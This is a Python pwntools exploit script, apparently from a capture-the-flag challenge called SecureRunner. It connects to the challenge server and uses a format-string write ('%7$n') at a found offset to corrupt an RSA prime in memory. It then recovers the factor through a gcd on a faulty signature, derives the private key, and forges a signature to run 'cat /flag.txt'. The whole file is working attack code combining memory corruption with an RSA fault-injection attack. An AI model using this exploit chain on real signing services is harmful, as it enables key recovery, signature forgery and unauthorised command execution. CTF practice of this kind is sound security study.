from pwn import *
from time import sleep
from gmpy2 import gcd
from Crypto.Util.number import bytes_to_long

server, port = "securerunner.sstf.site", 1337

#context.log_level='debug'

def injectFault(offset):
	r = remote(server, port)
	#r = process("./SecureRunner")

	r.sendlineafter(b" > ", b"2")
	sleep(0.1)
	n = int(r.readline().split(b" = ")[1])	#get n
	e = int(r.readline().split(b" = ")[1])	#get e

	r.sendlineafter(b" > ", b"9999")
	r.sendline(str(offset).encode())
	r.sendline(b"%7$n")

	return r, n, e

def try_offset(offset):
	print("offset:", offset)
	try:
		r, n, _ = injectFault(offset)

		r.sendlineafter(b" > ", b"0")
		new_n = int(r.recvuntil(b" 4)").split(b'\n')[3].split(b'it\'s')[2].strip())

		r.close()

		return n != new_n
	except Exception as e:
		return False

def find_offset():
	step = 1024 // 8 - 1	# 1 byte less than size of p

	offset = step
	while True:
		if try_offset(offset):
			return offset

		if try_offset(-offset):
			return -offset

		offset += step

def FaultInjectionAttack(offset):
	r, n, e = injectFault(offset)

	r.sendlineafter(b" > ", b"3")
	s = int(r.readline().split(b" = ")[1])	#corrupted signature
	m = bytes_to_long(b"ls -la /")			#message

	p = gcd(pow(s, e, n) - m, n)			#recover p from corrupted signature
	q = n // p 								#get q
	assert(p * q == n)

	d = pow(e, -1, (p - 1) * (q - 1))		#get d

	cmd = b"cat /flag.txt"					#command to be executed
	sign = pow(bytes_to_long(cmd), d, n)	#make signature

	r.sendlineafter(b" > ", b"4")			#execute the command with the signature
	r.sendlineafter(b" > ", cmd)
	r.sendlineafter(b" > ", str(sign).encode())

	print("Flag:", r.readline().decode())

	r.close()

## find an offset between allocated buffer and p (or q).
## offset = find_offset()   -> Will give you -2413.

offset = -2413
print("Offset", offset, "changed p * q!")

FaultInjectionAttack(offset)
